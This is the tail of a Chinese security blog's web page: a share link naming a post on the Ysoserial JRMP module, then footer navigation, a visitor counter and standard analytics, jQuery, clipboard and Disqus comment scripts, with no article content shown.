  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&t=Ysoserial-JRMP模块"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    Oceanzbz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
      <ul>
        
          <!-- 不蒜子统计 -->
          <span id="busuanzi_container_site_pv">
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
          </span>
          <span class="post-meta-divider">|</span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                  本站访客数<span id="busuanzi_value_site_uv"></span>人
          </span>
          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-QWTJSPQL4F');
</script>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
